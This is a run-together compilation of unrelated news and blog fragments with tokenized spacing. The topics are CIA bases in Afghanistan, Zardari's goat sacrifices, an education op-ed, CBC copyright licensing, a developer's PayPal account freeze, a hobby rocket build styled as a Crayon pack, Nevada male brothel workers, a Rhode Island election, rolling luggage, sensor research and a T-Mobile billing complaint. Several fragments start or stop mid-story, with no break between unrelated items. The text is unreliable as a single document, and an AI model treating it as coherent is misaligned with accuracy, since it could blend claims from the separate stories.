In recent months , American officials said , C.I.A. officers at the base had begun an aggressive campaign against a radical group run by Sirajuddin Haqqani , which has claimed responsibility for the deaths of dozens of American troops .
Over the past year , the C.I.A. has built up an archipelago of firebases in southern and eastern Afghanistan , moving agency operatives out of the embassy in Kabul and closer to their targets .

ISLAMABAD ( Reuters ) - Pakistani President Asif Ali Zardari has a black goat slaughtered at his house almost every day to ward off “ evil eyes ” and protect him from “ black magic , ” a newspaper reported Wednesday .
A spokesman for the president told the Dawn newspaper the goats were slaughtered as an act of Sadaqah -- meaning “ voluntary charity ” in Islam whereby one gives out money or the meat of a slaughtered animal to the poor to win Allah ’s blessing and stave off misfortune .
“ It has been an old practice of Mr Zardari to offer Sadaqah .
He has been doing this for a long time , ” the spokesman , Farhatullah Babar , told the paper .
Pakistan is a predominantly Muslim country where many of the well - off offer Sadaqah .
Though Muslim , many people also follow certain superstitious practices .
Hundreds of goats had been sacrificed at Zardari ’s house since he was sworn in September 2008 , the Dawn newspaper reported .
It said Zardari ’s detractors would see in his “ new - found religiosity ” a sign of nervousness in the face of growing woes .
Zardari , who rose to power after the assassination of his wife , former prime minister Benazir Bhutto , in late 2007 , has become increasingly unpopular and faces a range of problems from Islamist militancy to a stagnant economy and political rivalry .
A Supreme Court ruling last month throwing out an amnesty for Zardari , several top aides and thousands of political activists and government figures triggered a political storm and expectation that Zardari was on his way out .
ATLANTA , Georgia ( CNN ) --
Our educational system is essentially a Soviet - style government - run monopoly that could only be loved by the likes of Lenin and Stalin .
HLN Money Expert Clark Howard says the American education system is n't giving taxpayers their money 's worth .
Now , I know that 's a strong opening statement , but consider this :
The government decides where your kids go to school ; what curriculum they 'll study ; and even develops long - term educational plans just like the Communists devised five - year plans .
This kind of " one- size - fits - all " approach really punishes kids .
And zero tolerance policies are a symptom of the stranglehold our government has on schools .
For example , the Supreme Court recently heard a case about a 13 - year - old Arizona student suspected of possessing Advil back in 2003 .
For that crime , she was strip - searched to see if she had hidden ibuprofen pills on her body .
The Arizona school system maintained it had the right to do what it did .
What 's more , it remained defiant through the years , constantly appealing unfavorable lower court decisions when challenged .
Arizona ultimately took the case all the way up to the highest court in the land .
In late June , the Supremes ruled 8 - 1 that the school system 's actions were unconstitutional .
See Clark discuss why he thinks governments should n't own banks »
In another instance of an insane zero tolerance policy , The Washington Post reports that a Virginia teen was suspended for two weeks last year after taking a prescription birth - control pill during lunch .
This was not a religious or moral issue ; the school was instead arguing that it was illegal for students to have prescription pills on the premises .
That student even faced expulsion !
This is what we 've done by not offering school choice in our nation .
I have long been a fan of vouchers , charter schools and home schooling to bust up the government monopoly on the education of our children .
Do you think this whole issue does n't affect you because you do n't have kids ?
Think again .
Huge amounts of your taxes are still spent to support schools that are failures .
If this country is going to invest so much into government - run education , we should be taking a cue from a nation like Finland .
Simply put , the Finns have the best public education system in the world .
Their 15 year - old students are consistently excelling in standardized testing versus any other nation , according to the results of the most recent PISA exams ( Program for International Student Assessment ) -- a test of academic proficiency administered every three years in many countries .
Finnish students ranked No. 1 in science scores , and No. 2 in both math and reading .
And the United States ?
We come in at No. 29 in science , No. 35 in math , and a recent U.S. reading score which would n't even track in the top 10 countries in the world .
In Finland , children begin studying algebra , geometry and statistics in the first grade .
By 15 , they speak three languages , which , of course , is not uncommon throughout Europe .
According to The Dallas Morning News , a team of Texas educators recently traveled to Helsinki to learn from the Finns .
What they found was that teachers had 100 percent freedom to educate as they saw fit .
They treated their classroom like an entrepreneur would treat his or her business .
Contrast that to how we do things in America with our five - year plans and giant bureaucracies determining what gets taught .
Our brand of institutionalized " education lite " -- with far too few hours spent in the classroom and an antiquated summer vacation schedule from America 's agrarian days -- just is n't cutting it .
The Canadian Broadcasting Corporation has signed up with iCopyright , the American copyright bounty hunters used by the Associated Press , to offer ridiculous licenses for the quotation of CBC articles on the web ( these are the same jokers who sell you a " license " to quote 5 words from the AP ) .
iCopyright offers " licenses " to use taxpayer - funded CBC articles on terms that read like a bizarre joke .
You have to pay by the month to include the article on your website ( apparently no partial quotation is offered , only the whole thing , which makes traditional Internet commentary very difficult ! ) .
And you have to agree not to criticize the CBC , the subject of the article , or its author .
Thanks for fostering a dialogue , CBC !
The cherry on the cake ?

“ Is PayPal good for your microISV business ? ” A short PayPal horror story
Dec 18 Update :
This morning I was contacted by a PayPal manager from their fraud department who talked with me close to an hour .
He went out of his way to apologize for their mishandling of my case .
He told me that my account was initially so severely limited because in early October there were several attempted transfers that were marked as possible fraud .
In fact , these attempts were my own attempts to fund the PayPal account using my own credit card by requesting money from myself .
I needed the funds in order to perform a mass payment which is only possible if there is money in PayPal ’s account .
And I can’t fund my PayPal account from the bank in my country .
I told the manager that these were my own attempts to fund the account and these are in fact my own credit cards and there was no attempted fraud there .
But , according to him , when my account ’s activity rose because of MacGraPhoto sale , the system took these funding attempts as additional fraud factor .
He later told me that all the representatives to whom I talked did n’t act professionally and did n’t perform the needed due diligence on my account to see that these funding attempts were one of the sources of the limitations .
It made sense when we talked on the phone but now I ’m not sure how it ’s connected to their inability to understand that my business is legitimate .
The original source of the limitation does n’t explain their failure at investigating the case .
He told me that it was very easy for him to see that the business was legitimate since I ’m active on social media , have LinkedIn , Twitter and Facebook accounts , all of which are supporting my identity as Mac developer .
Also , he admitted that it was easy to find info on MacGraPhoto promotion since it was quite well covered by the blogosphere and even an interview with me on Ars Technica about it .
Eventually , he lifted all limitation from my account and dismissed the October cases of my funding , which were marked as fraud .
Of course , we ’re very glad that our funds are now unfrozen but it still does n’t clear PayPal of their mishandling of our case .
For example , where the representative told me that she escalated my issue to the fraud department , she lied .
There was no escalation .
It looks like nobody has taken any serious look into whatever faxes that I sent because anyone with half a brain and 10 minutes of time could have found on the net all he wanted about me , my business , this specific sale and our partners in the bundle .
I wrote it all on the first page of the fax , including the PayPal account emails of our partners , whom they could simply call .
End of Dec 18 Update .
Original article below .
I ’m running my Mac indie software business for more than 3 years now .
For the first 2.5 years , all my sales went through Kagi and later I decided to switch to PayPal .
The sales were not high , PayPal worked well and all was good .
This year , me and my partner Kosta decided to do some creative marketing for our picture framing application , ImageFramer .
We decided to partner with several other developers of graphics software for the Mac and to sell all the software together , as a bundle , for 2 weeks .
After months of preparations , negotiations and development , finally , MacGraPhoto bundle was launched on Nov 16 .
We , at Apparent Software , were responsible for all the execution of the sale and part of it included handling all the money related issues , such as collecting the payments and distributing to other developers their shares .
There were 6 other developers in addition to us .
We corresponded over email , sent them a Terms and Conditions document and got their agreement to it by email .
We chose PayPal as our payment processor for several reasons but the main ones were the low fees , the fact that we already knew how to integrate it to the sales backend and that it should be easy to pay them and to affiliates .
We used our regular PayPal account , which we used for regular sales .
We did n’t expect what happened next .
The launch was successful and we were pleased with how the sales progressed in the first days .
Three days into the sale I ’ve got a phone call from PayPal and the person on the other side asked me about the nature of the spike in account activity .
I explained that we had a 2 - week sale , a special promotion and it looked like the call went fine .
The next day , without any warning , I get an email from PayPal that states , among other things :
We have observed activity in this account that is unusual or potentially high risk .
For your protection , we have limited access to your account until additional security measures can be completed .
We apologize for any inconvenience this may cause .
I log into my PayPal account and what do I see ?
“ For my protection ” they have limited the ability of my account to withdraw or send money but most severely , they also disallowed the account to receive payments !
Frantically , I go to MacGraPhoto ’s buy page , click buy and see a message “ The seller ca n’t receive payments at this time ” .
At about the same time I get an email from a potential customer that says that he ca n’t buy the bundle .
In the server log , I see other people trying to buy the bundle and leaving .
Lost sales .
Not good .
Not good at all .
My PayPal ’s page lists lots of things that I need to provide to PayPal regarding my personal identity and regarding the sales .
Some requests are totally not relevant to the case or to our business .
Luckily , I have a partner in this business .
He also has a personal PayPal account which he uses to buy things .
We quickly convert it to a business account and modify the system to use it instead .
Total downtime of our ability to sell was above an hour .
Luckily , this happened when I was near the computer and not during the night or we ’d have long hours of downtime and thousands of dollars in lost sales , possibly ruining the whole operation because of lost trust .
I quickly send some Photo ID of myself to PayPal and call their customer support .
After fighting for some time with their voice routing system ( I mostly lost ) I finally got to an “ agent ” who verified my identity and then transferred my call to a “ Limitation Specialist ” .
We talked about the nature of the business .
They wanted to see some shipping confirmation and tracking numbers .
I explained that we ’re selling downloadable software and the “ shipment ” is actually an email with license codes .
I also explain that it ’s a 2 - week promotion where we bundled with some other developers for a mutual sale .
She then asks me to fax to her signed agreements that they , the developers , allow me to sell their software .
I tell her that we only have email correspondence and she says ok , fax it .
I prepare fax with our terms and conditions document , 6 email correspondences where other participants agree to the terms and also , in the first page , explain the whole issue of the bundle sale .
Total of 26 pages .
It takes almost a day to see the faxes in the system .
Finally , on Nov 22 I get an email that they ’ve received the documents .
I call back customer support , finally get another “ limitations specialist ” who checks the faxes and says me that it looks ok but I ’ll have to wait to get my answers over the email in the next 48 hours .
After 24 hours I receive an email that includes :
- Please provide a letter of authority from the original copyright owner and copy of the licensing agreement which states you have the authority to duplicate and distribute the product .
That ’s exactly what I sent in the faxes , though .
All six developers agreed by an email and trusted us and our email conversation to collect thousands of dollars worth of their share of the sales .
Apparently , what ’s good for all sides of the deal is not good for PayPal , who are only the means to transfer the money .
I call back PayPal support and talk to another “ specialist ” .
I explain the whole sale issue anew and tell that the first “ specialist ” told me that the faxes were ok .
Now this one tells me that no , email does n’t count , I ’ll have to fax real signed papers .
I explain that we did n’t do these .
It does n’t help .
In the process of our talk , I also learn that these “ specialists ” are not actually the people who decide to accept or reject the documents .
They are only phone support personnel who understand a little more in the whole limitation process .
And , it ’s totally impossible to directly talk to the people who actually decide .
So , it ’s like a broken phone anyway .
I ask the person to reconsider our previous documents and tell him that we started to collect signatures ( we indeed emailed the 6 developers by this time and asked them to print and sign a one - page , three sentences paper about the bundle ) .
He said ok .
Wait another day or two .
During the day we collect most of the signatures and then I receive another email from PayPal .
The subject was new : “ PayPal appeal denied ” .
The content :
" ... After reviewing your account , we have decided to close it because of security issues .
We are making every effort to minimize any disruption to your business ....
-----------------------------------
Disbursement options
-----------------------------------
Option 1 .
If you owe refunds to any of your buyers , you can use the money in your PayPal account to refund them ....
Option 2 . Money in your PayPal account will be held for 180 days .
After 180 days , we 'll email you information on how to receive your funds .
We regret any inconvenience this may cause "
So , now the money ( most of which is not even ours but of our bundle members ) is held for 6 months .
Sure , they are “ making every effort to minimize any disruption to your business ” .
Sure , no disruption at all .
I call PayPal again , get yet another “ specialist ” who tells me to fax the signed agreements when I have them .
Next morning we finally get all the signatures , I prepare a fax and send it .
A day later I get an email that they ’ve received the documents .
I call support again .
Ok , got your documents .
Wait up to “ 48 hours ” again .
In the meantime , we ’ve got really scared that the second account could be limited at any time as well , so as fast as we ’ve got a bit of significant amount of money , we ’d send it all to some of our 6 partners for a part of the sales .
I ’ve got no response after 2 and even 3 days .
I call again , another specialist tells me that since my account is kind of closed , she ’ll escalate the issue to the fraud department .
Expect a reply within 72 hours .
Within these 72 hours , Kosta ’s PayPal account was also limited .
But luckily for us , they still allowed the account to receive money , so at least we could continue to sell .
There were still several days until the end of the sale .
But we could n’t pay to our partners now .
And we did n’t have a 3rd PayPal account we could use for the sales .
Had they also closed Kosta ’s account to receive money , we ’d have no choice but to close the bundle sale before its promised time , thus bearing a lot of financial and trust loss .
So Kosta started to work on lifting the limitation from his account .
They asked him for a lot of things that they did n’t ask me .
But at first , they did n’t ask him to send “ license to sell ” other software .
In short , after about a week , lots of calls to support and faxes they actually removed the limitation from his account .
This happened after the bundle sale finished and we needed to pay our partners soon .
We still did n’t have all the money to pay them since a large sun lays frozen in my account .
Needless to say , I did n’t get any response , not after 72 hours nor after a week .
I called support again and was told that they wo n’t respond me because my appeal was denied and they do n’t reopen cases .
I wondered why the previous 2 times that I called they did tell me to send the documents .
What happened to the “ escalation ” ?
But talking to them was like talking to a brick wall .
“ PayPal decided that it does n’t want to do any more business with you ” was their standard response .
So , the bundle was a great and successful marketing experiment .
We had to add from our own money to pay the developers and now wo n’t see our money from it until the end of May .
Moreover , my PayPal account will stay forever limited and I wo n’t be able to use it for anything , even to pay for the services we use .
And since my credit cards and bank account are also linked to this PayPal account , I ca n’t buy from any PayPal seller using them ( I mean paying with a credit card through PayPal , without an account ) .
I now either need to apply for a new credit card or do n’t buy from people who only have PayPal as their payment option .
And it ’s not that I need another credit card in my life now only for this .
During one of my support calls , I asked the “ specialist ” if there was any way I could have prevented my account from being limited because of the higher transaction rate .
For example , perhaps I could contact them and notify in advance of the upcoming sale .
The answer was a definitive NO .
You get it ?
I did nothing wrong .
That ’s just how their system works .
Even though Kosta ’s PayPal account was “ clean ” for now we decided to leave PayPal as our payment processor at Apparent Software and moved to FastSpring .
They have higher fees but at least they have great and personal customer service and we hope they wo n’t freeze our ability to do business without any reason , “ for our protection ” .
We ’ll also have to look for another solution for MacGraPhoto 2 .
Summing this long story I want to say that I ’m totally shocked about how PayPal treats its customers .
Sellers are those who pay the fees and who make PayPal the business it is .
I wo n’t be using PayPal to sell anything from now .
They have grown too big to be efficient and caring for their customers .
Quick to make totally disruptive decisions and to dismiss legitimate businesses without really taking a look at what it is .
They took the liberty to totally halt our business , to cause lots of lost sales and a major cash flow blow only because we got successful with one promotion , after being their customers for a long time .
Right , they “ regret any inconvenience this may cause ” .
They are “ making every effort to minimize any disruption to your business ” .
If you ’re selling anything and use PayPal as your only payment option , I urge you to reconsider .
They can cut your oxygen supply right at peak of your success , of course “ for your own protection ” .
Sincerely , Jacob Gorban .

Crayon Pack
Since a friend pointed out that my I - ROC looked like a Crayon® , I 've had the idea in back of my mind to build a Crayon rocket .
Not just a Crayon rocket , but a pack of Crayon rockets !
The smallest pack of Crayons I could find had eight , so that is the number .
Of course , the eight rockets are pretty much standard mid-power rockets .
But , they were to be launched from a box ( the yellow and green Crayon box , of course ) in rapid succession .
I decided to build the kit from Loc / Precision components , since they have a nice selection listed on their site , including pre-slotted airframe tubing , which will save a lot of work .
Note that this project suffered a long hiatus .
I actually started it in 1998 , and it was one of my first scratchbuilding projects .
Work resumed in August 2004 , more than six years later and finally completed in September , just in time for XPRS .
The Pictures
Here I am in early September 2004 with the eight completed Crayon rockets .
These were six years in the making and now they 're done !
XPRS 2004 ( Half Way )
XPRS 2004 was a fantastic launch with three days of perfect launch weather with moderate temperatures , clear skys and no wind .
We arrived on Thursday for set - up and put the crayon pack on display until Sunday , when I finally had time to launch them .
Above you can see the crayons in their " box " and me starting to carry the whole thing out to the range on Sunday morning ( September 26 , 2004 ) .
The " box " is pretty heavy and with the eight crayons it becomes awkward to carry .
Above you can see another view of the pack as I 'm staking down the edges of the acrylic base to which the box is attached .
The stakes probably are n't necessary , but it seemed a prudent thing to make sure the box did n't fall over .
Paul Suchek dipped eight DaveyFire 28 F electric matches in IgniterMan pyrogen for me to use .
The nozzles on the G40s are quite small so you can't get much pyrogen onto the tips of the 28Fs and still get them into the nozzle .
Above you can see me wiring up the eight igniters in parallel .
Since these rockets use motor ejection and were already installed in their " box , " there was n't much to do other than connecting the igniters .
Here is the the obligatory " dumb rocket photo " with the Crayon Pack ready to fly .
The high contrast of the desert sunlight puts the crayons into deep shadow ;
In person , the different colors looked good through the cut - out in the box front .
Launch !
Up go the crayons .
Wait ; only four of them went !
Below is a great picture from Steve Pope , showing the crayons up close just as the four are leaving the box .
All eight of the Davey Fire matches popped , but only four of them ignited their motors .
The four that did fly flew very nicely as you can see in the pictures above .
If I would have gotten one failure , that would have been OK , although I 'd really been expecting all eight to fly .
But four ; that 's only half of them !
Here you can see the four crayons that remained in the box .
What 's wrong green , brown , yellow and orange ?
The bottom of the box got pretty blasted with residue from the other four motors , but the crayons that did n't fly were still in good condition .
That , and the fact that only four flew , made me determined to try again .
Of course , the question was what condition would the other four be in ?
Aside from some soot , the four left behind were ready to go again .
Would the other four fare as well ?
The first one we found was the violet crayon .
And it had a broken fin .
Well , no second try at XPRS .
The violet crayon fin broke cleanly in the acrylic , near the slot in the body tube .
This can be easily repaired with acrylic cement and violet can fly again .
However , the other three were found without major damage .
Above , you can see my wife Renée with the four crayons that flew .
The crayons went pretty high on the G40s .
RockSim had predicted they would fly to 2928 feet .
( The rockets weigh one pound each . )
The 10 second delay must have been just about perfect because there was no zippering of the paper body tubes at all .
LUNAR 2014 ( All 8 )
Nearly ten years later , I tried again to launch the Crayon Pack , this time at the LUNAR Snow Ranch launch of April 12 , 2014 , again on G40s .
This time , all 8 flew !
Watch directly on YouTube .
We arrived at Snow Ranch about 11 am , and set up a modest camp .
Here you can see the Crayon Pack and my lovely wife Renee .
It was quite a bit of work ( and took two tries ) to get all the igniters hooked up .
The first time , I tried using a clip whip ; when that failed , I just wired all the igniters together .
From high - speed photos , we can clearly see that there was a significant delay before any lit , the one lit , then the rest in a rush .
We recovered all but one ( the purple ) rocket , several through the kindness of people who stubled across them .
Once again , all survived just fine , except one fin broke ( the red ) .
This was a wonderful culmination to a very long project ( 16 years ! ) .
The Design
A Crayon is 93 mm ( 3.66 " ) long and 9 mm ( 0.35 " ) thick , overall .
The outer paper wrapping ( construction paper ) is about .5 m m thick , so the ends of the Crayon are actually thinner than the body .
To build this into the rockets , I needed a nosecone with the transitions and a tail section with a thickness reduction .
In the diagram below , the gray area indicates the paper wrapper ( and main body tube in my rockets ) and the black outline indicates the overall size of a Crayon .
All dimensions are in millimeters .
This is a bit stubby for a rocket ( 10 x as long as their width ) , but well within the allowed limits .
Since I decided to use Loc / Precision 2.56 tubing ( 66.8 mm ) and the widest part of a Crayon is 8.6 mm , my rockets are 7.77 x scale .
Dimension Crayon Rocket maximum diameter 8.6 92.7 diameter at ends 8.2 63.7 overall length 92.3 717.2 length of " covering " 76.4 593.6 length of " tail " 3.0 23.3 length of shoulder 2.8 21.8 length of nose 10.2 79.3 diameter at shoulder 6.4 49.7 diameter at tip 2.9 22.5
For simplicity 's sake , I decided to just use the body tube thickness to represent the paper thickness ( it 's a little less thick than the construction paper would but should still create the right effect ) .
So , the tail and nose cone would be designed to fit inside the body tube .
These require custom turned or molded parts .
( See the Adobe Acrobat drawings . )
Obviously , Crayons do n't have fins so I decided to make my fins out of clear acrylic plastic .
Acrylic is stiff , perfectly clear , break resistant , and easy to work .
Obviously , the fins are n't completely invisible , but they all but disappear in flight .
A local Tap Plastics store cut out the fins and finished them nicely for me so the edges are transparent and smooth .
I did n't have a way to turn the noses and tails ( Balsa Machining Services does n't do fully custom parts ) .
However , Jim Amos of Missile Works was very helpful and produced the parts for me exactly to my specifications , even using two different kinds of wood to help me get the right weight distribution !
If you need truly custom parts , check out Missile Works ( they also sell kits and electronics ) .
Originally , I planned to make the Crayon logo and text using decals , but the decals you can make on a home printer do n't work well on top of colored backgrounds .
Randy Brust had made vinyl decals for me for other projects and they 'd turned out great , so I asked him to come up with the artwork and decals for the Crayon Pack .
Randy even duplicated the Crayon logo for me in the correct scale .
Here are all the major components of the rockets ( aside from parachutes ) .
Pratt Hobbies small aramid bridle cord is used to attach the nose and parachute and is epoxied to the motor mount tube ( tucked inside them in this picture ) .
The noses have no lip , so I epoxied a short length of coupler inside the body tube , spaced down the correct amount and the noses slide into the body tubes and bottom out against the couplers .
These rockets are pretty simple , but multiplying all steps by eight makes things take a lot longer !
Above you can see me working on the rack of rockets .
For some reason , I did n't make any provision for launch guides initially ( in 1998 ) so here I 'm adding double ¼ " launch lugs to each rocket .
Painting
These rockets need a lot of different colors , two each for the eight Crayon colors ( except yellow ) .
This is a lot of paint !
I eventually decided to buy hobby shop spray paint cans to simplify things .
The first step was to seal and finish the noses and butts ( the wax parts ) .
First I painted the hardwood noses and balsa butts with epoxy and then sanded them .
Next was a thick layer of primer and finally several coats of paint .
( I wanted to get a rich , wet look to these parts .
Above , you can see the result .
I think they came out really nicely and those colors are absolutely stunning .
( Maybe even a bit too bright , but they 'll look good on the rockets . )
The next step was building the main rocket bodies .
These were relatively simple since they came slotted from Loc / Precision .
All I had to do at this point was cut them to length and install the MMT assemblies .
Next the tubes were primed and sanded .
( Finishing was done before the rocket was assembled to make things simpler . )
In the photo below left , you can see them ready for paint .
Of course , each tube was a different color so there was as much work finishing the tubes as finishing the turnings .
I also wanted a more matte finish ( to represent the construction paper crayon wrappings ) so I painted directly on top of the initial sanding with 150 grit sandpaper .
The paint colors were too shiny and too solid for paper
So , I misted on gray on the colored tubes and yellow on the gray tube .
This helped , but I still wanted to remove some of the shinyness so I finished them off with a matte clear finish .
( In the photo above right , I 've misted on the gray , but have n't yet applied the matte clear . )
These paints do n't do a perfect job of representing paper , but they definitely have a different look than the ultra glossy turned parts .
The Fins
As mentioned above , I used clear acrylic fins to make these rockets stable .
( The heavy noses might have been enough alone , but fins are always good for free rockets . )
The problem with acrylic is that it does n't bond well with epoxy .
I installed the fins in the usual through - the - wall manner and bonded them to the motor - mount tubes with epoxy .
However , I did n't feel secure enough about this joint so I also added acrylic strips to either side of the fin , just inside the airframe .
These strips were bonded with special cement for acrylic and thus are much stronger .
The strips should prevent the fins from pulling out of the slots just in case the epoxy bonds do n't hold .
On the right , you can see the inside of the body tube after bonding the fins into place 1/8 " square acrylic struts are bonded to the fins inside the body tube .
Here you can see the completed bodies ( without the noses or butt pieces ) .
The fins are on too ; you can see them if you look closely .
The Box
I wanted the rockets to launch out of a box that looked like the coardboard box in which eight Crayons are packed .
Of course , my crayons have fins and need launch rods so they can't really be packed in like actual Crayons .
In the diagram above , you can see the eight rockets laid out in two rows .
From the front it will appear that they are in a single row , but there is plenty of space for the fins and the launch and guide rods .
In the diagram above , the thick gray line at the top represents the front of the box , which is done as a sign using vinyl graphics .
The sides and back of the " box " are missing to allow the exhaust gasses to escape .
The front of the box is 25 " wide 34 " high .
This is a little over scale , but will allow plenty of space to hide the launch hardware behind .
To the left is the artwork for the front of the box .
Note that the half - circle near the top is cut out to show the rockets behind ( inside ) the box , just like the real Crayon box .
Compare this to the real Crayon box below .
The front was made as a vinyl sign by my local FastSigns store .
I use them to make vinyl decals for many of my rockets , but this is the first time I actually made a sign !
The bottom was attached to a larger piece of clear acrylic , which would be staked down to the playa .
The front ( the sign ) was then epoxied along the bottom and reinforced with angle brackets at both sides .
In the pictures above , you can see the back of the box .
On the left the two pieces are shown attached ( you can see the clamps ) .
On the right is a close - up of one rocket and its launch rod ( stainless steel ) and guide rods ( fiberglass ) .
The two guide rods , along with the launch rod , cradle each rocket like a tower and prevent the rockets from bumping into one another .
A third fiberglass rod provides a stand - off from from the bottom of the box to place the rockets at the right height and provide space for the igniters .
Crayons ®
Binney & Smith , the makers of Crayola ( TM ) products , have a web site .
I also wrote to them for a promotional pack and they sent me a nice folder of stuff including a large picture of the first pack of Crayons made ( 1903 ) .
Compare them to the current pack of eight ( 1998 ) :
The Post Office also got into the act with a commemorative stamp as part of their " 20th Century " series .

New era :
Health authorities open brothels to male prostitutes
Reader poll
The brothel industry says most Nevadans find brothels socially acceptable .
Do you find them acceptable ?
Yes .
Brothels are socially acceptable .
No .
Brothels are n't socially acceptable .
View results
Men may now join the ranks of Nevada ’s brothel prostitutes , after a unanimous decision today that added language to health codes so male sex workers could be tested for infectious diseases .
A brothel industry lobbyist -- in what could be considered a befuddling double standard -- bemoaned the change , comparing it to the industry ’s “ Pearl Harbor . ”
He managed to voice concerns about homosexual sex entering the industry without ever saying “ gay sex ” or “ homosexual . ”
Men were previously barred in Nevada from the oldest profession because codes specified that prostitutes must undergo “ cervical ” testing for sexually transmitted diseases , which ruled out men .
Bobbi Davis , owner of the Shady Lady Ranch , a small brothel near Beatty , wanted to add male prostitutes to her stable of sex workers .
And while there have been plans for brothels to hire men in the past , Davis made the first - ever request to have the Nevada State Board of Health add urethral exams to the guidelines .
That allows male sex workers to be tested for sexually transmitted diseases .
Davis has said the men could start working at her five - bed brothel starting in the New Year .
The male prostitutes will decide for themselves whether to accept male or female clients , she said , just as the female prostitutes do now .
The health board approved the change in what an attorney from the ACLU , representing Davis , called “ housekeeping . ”
George Flint , the former Assemblies of God minister who has been lobbying for the Nevada Brothel Owners Association for 24 years , said he “ reluctantly -- and I underscore reluctantly ” agrees to the change .
Flint refused to be interviewed by the Sun Thursday , and could not yet be reached for comment today .
But because female prostitutes in Nevada service both men and women , his complaints about changing the status quo can be interpreted as a problem the industry has with gay sex .
Flint told regulators today that he was going on the record with concerns about the board ’s agreement , so when he goes before legislators in 2011 they will know that the industry opposed male prostitution .
The brother industry has previously tried to avoid any controversy .
“ There should be some fallout and backlash from this decision , ” Flint said .
“ Some may feel it ’s a repugnant thing to do or something that does not have the appetite of the state as a whole . ”
“ We ’ve worked hard for years to make the traditional brothel business in this state socially acceptable an something we can be proud of that most Nevadans accept , ” Flint added .
“ We have some concerns that this can be diluted by what Ms. Bobbi Davis wants to try . ”
Flint went on to say that he ’s proud of the industry ’s track record in preventing the passage of HIV , the virus that causes AIDS , between prostitutes and clients .
“ Now we ’re going to get into an areas that does n’t enjoy the same track record that our industry has enjoyed , ” he said .
Flint said he could not oppose the regulation change that allows male prostitution because it ca n’t be legal for women but not for men .
But he said today ’s decision was like Pearl Harbor for the brothel industry .
“ It was inevitable with Pearl Harbor we ’d have a problem there someday , and we ’ve known this would be a problem , too , ” he said .
Just a few days after Democrats lost Ted Kennedy 's old senate seat Republicans in nearby Rhode Island think they can defeat Congressman Patrick Kennedy , Teddy 's son .
His opponent , John Loughlin , a state representative , has already raised more money than any candidate before him who opposed Kennedy .
GOP Chairman Giovanni Cicione said on Wednesday that what happened to Martha Coakley could happen to Patrick Kennedy too .
" In this cycle , with a good candidate like we have with John Loughlin , the national scene shifting away from Kennedy - type politics , and independent voters looking for options , I think he 's incredibly vulnerable , " Cicione said .
Loughlin said the economy has to be the key issue " We need to put the money back into the hands of Rhode Islanders , " he said .
Patrick Kennedy has been elected eight times but in recent months faced a tough battle with the Catholic Bishop of Rhode Island Thomas Tobin who ordered him not to receive communion because of his stance on abortion rights .
Kennedy has also had a troubled history with drugs and alcohol and admitted he was bipolar .
Rumors abound that some of the successful team that led Scott Brown to victory in Massachusetts are headed to Rhode Island to take part in the Kennedy race .
But Bill Lynch , chairman of the state Democratic Party , said personal problems will not affect Kennedy .
" The people in that district know him .
They trust him , " Lynch said .
" They 're aware of the problems he 's had .
He 's dealt with that in a candid way . "
Loughlin said on Wednesday that he had raised $ 230,000 .
As of December 31 Kennedy had raised $ 544,885 but if the race is close the national Republican and Democratic committees are expected to get involved .
Wheels on luggage
New ideas come hard .
An anecdote from Robert Shiller 's new book , The New Financial Order , brings this home :
[ from a footnote - Ben ]
Sadow managed to talk to a vice president at Macy's , who agreed in the early 1970s to start selling the luggage .
The suitcases did indeed sell , and set off a major trend , even though Sadow 's initial model , with fur tiny wheels , was unstable .
If one walked fast while pulling it , the suitcase wobbled from side to side and sometimes developed a rocking cycle with increasing amplitude unilt the suitcase fell over sideways .
Since the suitcase in its normal upright resting position tended to be low relative to one 's hand , the handstrap had to be fairly long , and because it was flexible , did not allow any control of side - to - side wobble .
One tried walking in a bent - over position to keep one 's hand closer to the suitcase for better control , which was uncomfortable and still mostly unsuccessful in controlling the wobble .
[ end footnote ]
Sadaw 's suitcases were a big improvement over suitcases without wheels , but they tended to wobble and fall over when pulled .
The next great advance did not come until nearly twenty years later when a Northwest Airlines pilot , Robert Plath , invented a suitcase with two wheels widely spaced , so that the suitcase rolls along sideways with a wide axel between the two wheels .
This , combined with a rigid retractable pulling handle finally yielded a stable , easily pulled suitcase that can also be used as a platform for other articles .
He called it the " Rollaboard . "
In computing , the vision always precedes the reality by a decade or more .
The pattern has held true from the personal computer to the Internet , as it takes time , brainpower and investment to conquer the scientific and economic obstacles to nudging a game - changing technology toward the mainstream .
The same pattern , according to scientists in universities and corporate laboratories , is unfolding in the field of sensor - based computing .
Years ago , enthusiasts predicted the coming of “ smart dust ” — tiny digital sensors , strewn around the globe , gathering all sorts of information and communicating with powerful computer networks to monitor , measure and understand the physical world in new ways .
But this intriguing vision seemed plucked from the realm of science fiction .
Smart dust , to be sure , remains a ways off .
But technology ’s virtuous cycle of smaller , faster and cheaper has reached the point that experts say sensors may soon be powerful enough to be the equivalent of tiny computers .
Some ambitious sensor research projects provide a glimpse of where things are headed .
Last year , Hewlett - Packard began a project it grandly calls “ Central Nervous System for the Earth , ” a 10 - year initiative to embed up to a trillion pushpin - size sensors around the globe .
H.P. researchers , combining electronics and nanotechnology expertise , announced in November that they had developed sensors with accelerometers that were up to 1,000 times more sensitive than the commercial motion detectors used in Nintendo Wii video game controllers and some smartphones .

T- Mobile makes no sense
For reasons that are n't material to this rant , I 'm trying to get a T - Mobile SIM card set up with T - Mobile 's ridiculously named " Even More Plus 500 Talk +
Text + Web " plan .
At this point I have a SIM card , and after much pain and suffering in phone conversations and online chat support , I have an account that is fully paid up .
Let 's log in to the " My T - Mobile " site 's " Billing & Payments " page to see how much I currenly owe :
Ok it says I owe $ 62.42 by 1/19/2010 ( today ) for service from 2/9/2010 - 3/8/2010 ( next month ) .
But it also says that my monthly charges for my previous bill are $ 127.42 due on 3/9/2010 ( two months from now ) .
None of those numbers seem to add up to $ 59.99 , which is what the " Even More Plus 500 Talk +
Text + Web " plan is advertised as costing , but I suppose $ 62.42 could equal $ 59.99 if one were to imagine that T - Mobile felt they could put a few " fees " on there that for whatever reason could be assumed not to count .
But what 's with the $ 127.42 ?
And what 's with the due dates ?
Let 's click " See details " to see details :
Wait , bill summary ?
I wanted details !
And hold on , this page says my account balance is $ 0.00 , and that I paid $ 62.42 on 1/20/10 ( tomorrow ) .
It also gives my monthly charges twice ... once as $ 0.00 , and once as $ 127.42 !
I guess if you average them it adds up to $ 63.71 , which is similar to $ 62.42 ...
Oh look , the details are below the fold .
This says the next service period is $ 63.71 , that they 've received $ 62.42 , that the previous balance was $ 63.71 , and that they " adjusted " my account by $ 65.00 ( the result of my calling billing support because they had n't applied the $ 63.71 they actually charged me to my account ) , and apparently that all adds up to me owing $ 0.00 ... by 02/05/2010 .
Clearly maths is not their strong point .
